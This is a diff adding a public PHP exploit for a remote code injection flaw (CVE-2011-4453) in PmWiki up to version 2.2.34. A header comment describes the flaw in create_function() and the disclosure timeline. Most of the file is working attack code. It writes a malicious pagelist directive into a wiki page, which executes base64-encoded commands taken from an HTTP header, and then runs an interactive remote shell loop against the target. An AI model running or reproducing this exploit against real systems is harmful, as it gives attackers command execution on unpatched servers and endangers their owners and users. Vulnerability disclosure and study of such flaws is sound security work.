@@ -1,0 +1,103 @@
+<?php
+
+/*
+    -------------------------------------------------------------
+    PmWiki <= 2.2.34 (pagelist) Remote PHP Code Injection Exploit
+    -------------------------------------------------------------
+    
+    author...............: Egidio Romano aka EgiX
+    mail.................: n0b0d13s[at]gmail[dot]com
+    software link........: http://www.pmwiki.org/
+    affected versions....: from 2.0.0 to 2.2.34
+    
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] vulnerable code in PageListSort() function defined into /scripts/pagelist.php
+    
+    452.      $code = '';
+    453.      foreach($opt['=order'] as $o => $r) {
+    454.        if (@$PageListSortCmp[$o]) 
+    455.          $code .= "\$c = {$PageListSortCmp[$o]}; "; 
+    456.        else 
+    457.          $code .= "\$c = @strcasecmp(\$PCache[\$x]['$o'],\$PCache[\$y]['$o']); ";
+    458.        $code .= "if (\$c) return $r\$c;\n";
+    459.      }
+    460.      StopWatch('PageListSort sort');
+    461.      if ($code) 
+    462.        uasort($list,
+    463.               create_function('$x,$y', "global \$PCache; $code return 0;"));
+    464.      StopWatch('PageListSort end');
+    
+    Input passed through 'order' parameter of 'pagelist' directive isn't properly sanitized before being used
+    in a call to create_function() at line 463. This can be exploited to inject and execute arbitrary PHP code.
+    Successful exploitation of this vulnerability might require authentication if the wiki isn't public writable.
+    
+    [-] Disclosure timeline:
+    
+    [09/11/2011] - Vulnerability discovered
+    [11/11/2011] - Issue reported to http://www.pmwiki.org/wiki/PITS/01271
+    [11/11/2011] - Version 2.2.35 released: http://www.pmwiki.org/wiki/PmWiki/ChangeLog#v2235
+    [12/11/2011] - CVE number requested
+    [15/11/2011] - Assigned CVE-2011-4453
+    [23/11/2011] - Public disclosure
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die("\n[-] No response from {$host}:80\n");
+ 
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+------------------------------------------------------------+";
+print "\n| PmWiki <= 2.2.34 Remote PHP Code Injection Exploit by EgiX |";
+print "\n+------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /pmwiki/\n";
+    die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$phpcode = "']);error_reporting(0);passthru(base64_decode(\$_SERVER[HTTP_CMD]));print(___);die;#";
+$payload = "action=edit&post=save&n=Cmd.Shell&text=(:pagelist order={$phpcode}:)";
+
+$packet  = "POST {$path}pmwiki.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+if (!preg_match("/Location/", http_send($host, $packet))) die("\n[-] Edit password required?!\n");
+
+$packet  = "POST {$path}pmwiki.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Content-Length: 11\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\nn=Cmd.Shell";
+
+while(1)
+{
+    print "\npmwiki-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match("/\n\r\n(.*)___/s", $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+?>
